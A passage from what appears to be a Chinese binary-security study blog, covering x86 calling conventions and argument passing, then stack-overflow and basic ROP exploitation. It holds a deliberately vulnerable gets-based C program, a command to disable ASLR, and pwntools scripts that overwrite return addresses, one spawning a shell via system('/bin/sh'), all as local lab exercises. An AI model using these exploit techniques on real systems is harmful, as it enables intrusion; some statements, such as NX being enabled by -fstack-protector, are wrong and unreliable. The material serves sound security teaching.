常见调用约定</h4><p><strong>cdecl调用约定</strong></p><p>又称C调用约定，是C&#x2F;C++编译器默认的函数调用约定。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。名字修饰约定是在函数名前添加一个下划线；但对于C++函数，使用不同的名字修饰方式。</p><p><strong>stdcall调用约定</strong></p><p>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。函数参数按照从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递。由被调函数负责清除栈中的参数，返回值在EAX中。对于C函数，名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数大小，如_functionname@number.</p><p><strong>fastcall调用约定</strong></p><p>通常使用ECX和EDX寄存器传递前两个DWORD（四字节双字）类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈。被调函数在返回前负责清除栈中的参数，返回值在EAX中。名称修饰方式是使用两个@修饰函数名称，后跟十进制数表示的函数参数列表大小（字节数），如@function_name@number。</p><p><strong>thiscall调用约定</strong></p><p>C++类中的非静态函数必须接收一个指向主调对象的类指针（this指针），并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p>参数按照从右向左顺序入栈。<strong>若参数数目固定</strong>，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；<strong>若参数数目不定</strong>，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。</p><p>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%eax寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p><p><strong>naked call调用约定</strong></p><p>对于使用naked call方式声明的函数，编译器不产生保存（prologue）和恢复（epilogue）寄存器的代码，且不能用return返回返回值（只能用内嵌汇编返回结果），故称naked call。该调用约定用于一些特殊场合，如声明处于非C&#x2F;C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。</p><p>注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__declspec(naked) int __stdcall function(int a, int b) &#123;<br>    ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)<br>    __asm mov eax, a<br>    __asm add eax, b<br>    __asm ret 8<br>&#125;<br></code></pre></td></tr></table></figure><p>__declspec是微软关键字，其他系统上可能没有。</p><p><strong>pascal调用约定</strong></p><p>Pascal语言调用约定，参数按照从左至右顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><img src="/2024/08/15/二进制安全-基础/image-20240804191539926.png"  alt="image-20240804191539926" style="zoom: 50%;" /><p>Windows下可直接在函数声明前添加关键字<code>__stdcall</code>、<code>__cdecl</code>或<code>__fastcall</code>等标识确定函数的调用方式，如<code>int __stdcall func()</code>。Linux下可借用函数attribute机制，如<code>int __attribute__((__stdcall__))func()</code>。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">int __attribute__((__cdecl__)) CalleeFunc(int i, int j, int k)&#123;<br>// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;<br>//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;<br>    return i+j+k;<br>&#125;<br>void CallerFunc(void)&#123;<br>    CalleeFunc(0x11, 0x22, 0x33);<br>&#125;<br>int main(void)&#123;<br>    CallerFunc();<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p><img src="/2024/08/15/二进制安全-基础/image-20240804194322396.png"  alt="image-20240804194322396" style="zoom: 50%;" /><h4 id="5-2-调用约定影响"><a href="#5-2-调用约定影响" class="headerlink" title="5.2 调用约定影响"></a>5.2 调用约定影响</h4><p>当函数导出被其他程序员所使用（如库函数）时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。</p><p>在多语言混合变成时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重的问题。</p><p>以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：<code>int __stdcall add(int a, int b);</code></p><p>在Delphi中调用该函数时也应声明为stdcall约定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">add</span><span class="hljs-params">(a: Integer; b: Integer)</span>: Integer; stdcall; <span class="hljs-comment">//参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数</span><br>external <span class="hljs-string">&#x27;a.dll&#x27;</span>; <span class="hljs-comment">//指定被调DLL文件的路径和名称</span><br></code></pre></td></tr></table></figure><p>不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而<strong>被调函数必然能自己完成正常清栈</strong>，因此，在跨平台调用中，通常使用stdcall调用约定。</p><p>此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误（报告被调函数未定义）。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序（使用C++编译器），通常应这样声明头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _cplusplus</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    type <span class="hljs-title function_">Func</span><span class="hljs-params">(type para)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _cplusplus</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p><h4 id="5-3-x86函数参数传递方法"><a href="#5-3-x86函数参数传递方法" class="headerlink" title="5.3 x86函数参数传递方法"></a>5.3 x86函数参数传递方法</h4><p>x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序与函数参数声明顺序一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p><h5 id="5-3-1-整型和指针参数的传递"><a href="#5-3-1-整型和指针参数的传递" class="headerlink" title="5.3.1 整型和指针参数的传递"></a>5.3.1 整型和指针参数的传递</h5><p>整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同（均为四字节）。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</p><img src="/2024/08/15/二进制安全-基础/image-20240804200639148.png"  alt="image-20240804200639148" style="zoom:67%;" /><h5 id="5-3-2-浮点参数的传递"><a href="#5-3-2-浮点参数的传递" class="headerlink" title="5.3.2 浮点参数的传递"></a>5.3.2 浮点参数的传递</h5><p>浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4个字节。</p><img src="/2024/08/15/二进制安全-基础/image-20240804201550247.png"  alt="image-20240804201550247" style="zoom:67%;" /><h5 id="5-3-3-结构体和联合体参数的传递"><a href="#5-3-3-结构体和联合体参数的传递" class="headerlink" title="5.3.3 结构体和联合体参数的传递"></a>5.3.3 结构体和联合体参数的传递</h5><p>结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p><p>对于一些RISC处理器（如PowerPC），其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，<code>R3~R10</code>共8个寄存器用于传递整型或指针参数，<code>F1~F8</code>共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long_double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的发昂是更低效。可见，PowerPC程序中，函数参数采用指针结构体的指针并不能提高效率，不过通常这是良好的编程习惯。</p><h4 id="5-4-x86函数返回值传递方法"><a href="#5-4-x86函数返回值传递方法" class="headerlink" title="5.4 x86函数返回值传递方法"></a>5.4 x86函数返回值传递方法</h4><p>函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时：</p><ul><li><p>若返回值不超过4字节（如int、short、char、指针等类型），通常将其保存在EAX寄存器中，调用方式通过读取EAX获取返回值。</p></li><li><p>若返回值大于4字节而小于8字节（如long long或_int64类型），则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p></li><li><p>若返回值为浮点类型，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</p></li><li><p>若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化成foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。</p></li><li><p>不要返回指向栈内存的指针，如返回被调函数内局部变量地址（包括局部数组名）。因为函数返回后，其栈帧空间被”释放“，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p><p>函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void。</p></li></ul><p>64位寄存器的图：</p><img src="/2024/08/15/二进制安全-基础/image-20240804203823065.png"  alt="image-20240804203823065" style="zoom: 67%;" /><p>需要注意的是，32位和64位程序有以下简单的区别</p><ul><li>x86<ul><li>函数参数在函数返回地址的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在RDI，RSI，RDX，RCX，R8和R9寄存器中，如果还有更多的参数的花，才会保存在栈上。</li><li>内存地址不饿能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</li></ul></li></ul><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据</li><li>写入的数据大小没有被良好地控制</li></ul><h3 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h3><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限。**下面，简单示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br><br>    gets(s);<br>    <span class="hljs-built_in">puts</span>(s);<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    vulnerable();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行success函数。</p><p>正常使用gcc对上述程序进行编译</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804210207078.png" class="" title="image-20240804210207078"><p>gets本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，gcc编译指令中，-m32指的是生成32位程序；-fno-stack-protector指的是不开启堆栈溢出保护，即不生产canary。此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭PIE（Position Independent Executable），避免加载基址被打乱。不同gcc版本对于PIE的默认配置不同，可以使用命令gcc -v查看gcc默认的开关情况。如果含有–enable-default-pie参数则代表PIE默认已开启，需要在编译指令中添加参数-no-pie</p><p>使用如下指令进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example<br></code></pre></td></tr></table></figure><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804210932844.png" class="" title="image-20240804210932844"><p>编译成功后，可以使用checksec工具检查编译出的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ checksec stack_example<br></code></pre></td></tr></table></figure><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112014666.png" class="" title="image-20240805112014666"><p>编译时的PIE保护，Linux平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了PIE保护，还需要系统开启ASLR才会真正打乱基址，否则程序运行时依旧会加载一个固定的基址上（不过和No PIE时基址不同）。可以通过修改<code>/proc/sys/kernel/randomize_va_space</code>来控制ASLR启动与否，具体的选项有：</p><ul><li>0，关闭ASLR，没有随机化。栈、堆、.so的基地址每次都相同。</li><li>1，普通的ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的ASLR，在1的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭Linux系统的ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，此次演示关闭ASLR，在编译时关闭PIE。也可以尝试ASLR、PIE开关的不同组合，配合IDA及动态调试功能观察程序地址变化情况（在ASLR关闭、PIE开启时也可以攻击成功）。</p><p>确认栈溢出和PIE保护关闭后，利用IDA来反编译一下二进制程序并查看vulnerable函数。可以看到</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805095317059.png" class="" title="image-20240805095317059"><p>该字符串距离ebp的长度为0x14，那么相应的栈结构为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">             +-----------------+<br>             |     retaddr     |<br>             +-----------------+<br>             |     saved ebp   |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>通过IDA View-A窗口可以看到success的地址，其地址为0x08049186</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112349650.png" class="" title="image-20240805112349650"><p>由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">             +-----------------+<br>             |    0x08049186   |<br>             +-----------------+<br>             |       bbbb      |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x000011AD在内存中的形式是</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">86</span>\<span class="hljs-keyword">x</span><span class="hljs-number">91</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>但是，无法做到直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。所以需要想办法将\x3b作为一个字符输入进去。那么此时，就需要使用一波pwntools，这里利用pwntools的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## 构造与程序交互的对象</span><br>sh = process(<span class="hljs-string">&#x27;./stack_example&#x27;</span>)<br>success_addr = <span class="hljs-number">0x08049186</span><br><span class="hljs-comment">## 构造payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x14</span> + <span class="hljs-string">b&#x27;bbbb&#x27;</span> + p32(success_addr)<br><span class="hljs-built_in">print</span>(p32(success_addr))<br><span class="hljs-comment">## 向程序发送字符串</span><br>sh.sendline(payload)<br><span class="hljs-comment">## 将代码交互转换为手工交互</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>执行代码，获得结果</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805112640292.png" class="" title="image-20240805112640292"><p>发现，已经成功执行success函数。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>示例展示栈溢出中比较重要的几个步骤。</p><p><strong>寻找危险函数</strong></p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets,直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><p><strong>确定填充长度</strong></p><p>这一部分主要是<strong>计算所要操作的地址与所要覆盖的地址的距离</strong>。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看EBP即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候需要更加精细的计算。</li><li><strong>覆盖bbs段某个变量的内容</strong></li><li>根据现实执行情况，覆盖特定的变量或地址内容。</li></ul><p>之所以想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或间接地控制程序执行流程</strong>。</p><blockquote><p>Linux下ASLR与PIE</p><p>首先，ASLR是操作系统的功能选项，作用于executable(ELF，可执行文件)装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc,….）功能选项，作用于executable编译过程，可将其理解为特殊的PIC，加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。</p><p>其次，ASLR早于PIE出现，所以有return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等绕过ASLR的技术；而在ASLR+PIE之后，这些bypass技术就都失效了，只能借助其他的信息泄露漏洞泄露基址（常用libc基址）。</p></blockquote><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p>随着NX（Non-eXecutable）保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。</p><blockquote><p>NX保护是一种重要的安全机制，它通过将数据段标记为不可执行来阻止攻击者在内存中执行恶意代码。</p><p>传统的内存布局中，代码段和数据段通常位于同一内存空间。攻击者可以利用缓冲区溢出漏洞，将恶意代码覆盖到数据段，并通过修改程序流程指针，让程序跳转到数据段执行恶意代码。</p><p>NX保护通过将数据段标记为不可执行，使得攻击者无法在数据段中执行代码。即使攻击者成功覆盖了数据段，程序也不会执行恶意代码。</p><p>启用的方法：</p><ol><li>使用支持NX保护的编译器编译程序，例如GCC编译器可以添加<code>-fstack-protector</code>选项来启用栈保护。</li><li>在操作系统中启用NX保护，例如在Linux系统中，可以使用sysctl命令启用<code>kernel.exec-shield</code>选项。</li></ol></blockquote><p>目前被广泛使用的攻击手法是<strong>返回导向编程（Return Oriented Programming）</strong>，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>gadgets通常是以<code>ret</code>结尾的指令序列，通过这样的指令序列，可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集的ret指令，从而改变了指令流的执行顺序，并通过数条gadget“执行”了一个新的程序。</p><p>使用ROP攻击一般得满足如下条件：</p><ul><li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li><li>可以找到满足条件的gadgets以及相应gadgets的地址。</li></ul><p>作为一项基本的攻击手段，ROP攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着gadgets在内存中的位置往往是不固定的。但幸运的是<strong>其对于对应段基址的偏移通常是固定的</strong>，因此我们在寻找到了合适的gadgets之后可以通过其他方式泄露程序运行环境信息，从而计算出gadgets在内存中的真正地址。</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>ret2text即控制程序执行程序本身已有的代码（即，<code>.text</code>段中的代码）。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码（也就是gadgets），这就是所要说的ROP。</p><p>这是，需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，需要想办法去绕过这些保护。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>其实，在栈溢出的基本原理中，已经介绍了这一简单的攻击。在这里，再给出另外一个例子，bamboofox中介绍ROP时使用的ret2text的例子。</p><p>首先查看一下程序的保护机制：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805141322445.png" class="" title="image-20240805141322445"><p>可以看出程序是32位程序，且仅开启了栈不可执行（NX）保护。接下来使用IDA反编译该程序。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805141719609.png" class="" title="image-20240805141719609"><p>程序在主函数中使用了gets函数，显然存在栈溢出漏洞。接下来查看反汇编代码：</p><img src="/2024/08/15/二进制安全-基础/image-20240805160009348.png"  alt="image-20240805160009348" style="zoom: 50%;" /><p>在secure函数又发现了存在调用<code>system(&quot;/bin/sh&quot;)</code>的代码，那么如果直接控制程序返回至<code>0x0804863A</code>，那么就可以得到系统的shell了。</p><p>下面就是如何构造payload，首先需要确定的是我们能够控制的s变量距离main函数的返回地址的字节数。</p><img src="/2024/08/15/二进制安全-基础/image-20240805160243661.png"  alt="image-20240805160243661" style="zoom: 50%;" /><p>可以看到该字符串是通过相对于esp的索引，所以需要进行调试，将断点下在call处，查看esp，ebp，如下：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805163832930.png" class="" title="image-20240805163832930"><p>可以看到esp为<code>0xff9bd220</code>,ebp为<code>0xff9bd2a8</code>,s相对于esp的索引为<code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s的地址为0xff9bd23c</li><li>s相对于ebp的偏移为0x6c</li><li>s相对于返回地址的偏移为0x6c+4（+4是因为ret_addr占四个字节）</li></ul><p>因此，最后的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## 构造与程序交互的对象</span><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>secure_addr = <span class="hljs-number">0x804863a</span><br><span class="hljs-comment">## 构造payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x6c</span> + <span class="hljs-string">b&#x27;bbbb&#x27;</span> + p32(secure_addr)<br><span class="hljs-built_in">print</span>(p32(secure_addr))<br><span class="hljs-comment">## 向程序发送字符串</span><br>sh.sendline(payload)<br><span class="hljs-comment">## 将代码交互转换为手工交互</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="re2shellcode"><a href="#re2shellcode" class="headerlink" title="re2shellcode"></a>re2shellcode</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>ret2shellcode，即控制程序执行shellcode代码。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>通常情况下，shellcode需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。</strong></p><p>在栈溢出的基础上，要想执行shellcode，需要对应的binary在运行时，shellcode所在的区域具有可执行权限。需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的ret2shellcode手法不再能直接完成利用。</strong></p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>检测程序开启的保护：</p><img 